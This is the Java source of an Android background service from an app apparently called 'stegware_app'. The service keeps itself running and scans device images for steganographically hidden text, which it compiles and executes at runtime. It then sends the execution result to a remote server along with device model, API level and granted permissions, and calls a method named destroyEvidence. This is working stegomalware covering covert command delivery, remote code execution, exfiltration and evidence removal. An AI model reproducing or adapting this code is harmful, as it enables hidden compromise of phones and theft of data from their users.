package com.android.stegware_app.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;

import androidx.annotation.Nullable;

import com.android.stegware_app.api.RetrofitClient;
import com.android.stegware_app.api.Send;
import com.android.stegware_app.api.schema.AttackSchema;
import com.android.stegware_app.api.schema.DeviceSchema;
import com.android.stegware_app.api.schema.TimingSchema;
import com.android.stegware_app.compile_utility.Compiler;
import com.android.stegware_app.compile_utility.exceptions.InvalidSourceCodeException;
import com.android.stegware_app.compile_utility.exceptions.NotBalancedParenthesisException;
import com.ayush.imagesteganographylibrary.Text.AsyncTaskCallback.TextDecodingCallback;
import com.ayush.imagesteganographylibrary.Text.ImageSteganography;
import com.ayush.imagesteganographylibrary.Text.TextDecoding;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import javassist.NotFoundException;
import javassist.android.Log;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class CommunicationService extends Service implements TextDecodingCallback {
    private static final String TAG = "CommunicationService";
    private static final String SECRET_KEY = "a";

    private Send send;
    private final Callback<String> callback = new Callback<String>() {
        @Override
        public void onResponse(Call<String> call, Response<String> response) {
        }

        @Override
        public void onFailure(Call<String> call, Throwable t) {
        }
    };

    MediaSearchService mediaSearchService = new MediaSearchService();

    public CommunicationService() {
        Retrofit retrofit = RetrofitClient.getRetrofit();
        send = retrofit.create(Send.class);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        onTaskRemoved(intent);

        Log.d(TAG, "Start service");

        try {
            getMedia();
            Thread.sleep(4000);
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }

        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());

        startService(restartServiceIntent);

        super.onTaskRemoved(rootIntent);
    }

    private void getMedia() throws IOException {
        Log.d(TAG, "Start search image");

        String absoluteMediaPath = mediaSearchService.getMediaPath();

        if (!absoluteMediaPath.equals("")) {
            Log.d(TAG, "Img trovata");
            Bitmap img = MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.fromFile(new File(absoluteMediaPath)));

            ImageSteganography imageSteganography = new ImageSteganography(SECRET_KEY, img);

            TextDecoding textDecoding = new TextDecoding(CommunicationService.this);
            textDecoding.execute(imageSteganography);

            mediaSearchService.removeMediaByPath(absoluteMediaPath);
        }

        Log.d(TAG, "End search image");
    }

    @Override
    public void onStartTextEncoding() {

    }

    @Override
    public void onCompleteTextEncoding(ImageSteganography result) {
        if (result != null) {
            if (!result.isDecoded()) {
                Log.d(TAG, "No message found");
            } else {
                if (result.isSecretKeyWrong()) {
                    Log.d(TAG, "Wrong secret key");
                } else {
                    Log.d(TAG, "Decoded");

                    dynamicCompiling(getApplicationContext(), result.getMessage());
                }
            }
        } else {
            Log.d(TAG, "Select image");
        }
    }

    private String getDeviceModel() {
        return android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
    }

    private int getApiLevel() {
        return android.os.Build.VERSION.SDK_INT;
    }

    private List<String> getPermissions(boolean onlyGranted) throws PackageManager.NameNotFoundException {
        PackageInfo info = getApplicationContext().getPackageManager().getPackageInfo(getApplicationContext().getPackageName(), PackageManager.GET_PERMISSIONS);
        String[] permissions = info.requestedPermissions;

        List<String> permissionsAssembled = new ArrayList<>();
        List<String> permissionsGrantedAssembled = new ArrayList<>();
        for (int i = 0; i < permissions.length; i++) {
            if ((info.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) {
                permissionsGrantedAssembled.add(permissions[i]);
            }

            permissionsAssembled.add(permissions[i]);
        }

        return onlyGranted ? permissionsGrantedAssembled : permissionsAssembled;
    }

    private AttackSchema getAttackSchema(String payloadId, String resultType, String result, double parseTime, double compileTime, double dynamicLoadingTime, double executionTime) throws PackageManager.NameNotFoundException {
        DeviceSchema device = new DeviceSchema(getDeviceModel(), getApiLevel(), getPermissions(true));

        TimingSchema timing = new TimingSchema(parseTime, compileTime, dynamicLoadingTime, executionTime);

        return new AttackSchema(device, payloadId, timing, resultType, result);
    }

    private void sendData(AttackSchema attackSchema) {
        Call<String> call = send.AttackData(attackSchema);
        call.enqueue(callback);
    }

    private void dynamicCompiling(Context context, String code) {
        Compiler compiler = new Compiler(context, code, context.getFilesDir());

        try {
            long startParsing = System.nanoTime();
            compiler.parseSourceCode();
            long endParsing = System.nanoTime();

            long startCompiling = System.nanoTime();
            compiler.compile();
            long endCompiling = System.nanoTime();

            long startLoading = System.nanoTime();
            compiler.dynamicLoading(context.getCacheDir(), context.getApplicationInfo(), context.getClassLoader());
            long endLoading = System.nanoTime();

            long startExecution = System.nanoTime();
            Object obj = compiler.getInstance("RuntimeClass");
            Method method = obj.getClass().getDeclaredMethod("run", Context.class);
            long endExecution = System.nanoTime();

            double timeToParse         = (endParsing    - startParsing)     / 1000000.0;
            double timeToCompile       = (endCompiling  - startCompiling)   / 1000000.0;
            double timeToDynamicLoad   = (endLoading    - startLoading)     / 1000000.0;
            double timeToExecute       = (endExecution  - startExecution)   / 1000000.0;
            String result = (String) method.invoke(obj, context);

            AttackSchema attackSchema = getAttackSchema(
                    "5ec26c30b5020e3ff0592a5f",
                    "String",
                    result,
                    timeToParse,
                    timeToCompile,
                    timeToDynamicLoad,
                    timeToExecute
            );

            sendData(attackSchema);

            compiler.destroyEvidence();
        } catch (NotBalancedParenthesisException | InvalidSourceCodeException | NotFoundException | IOException | InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }
}
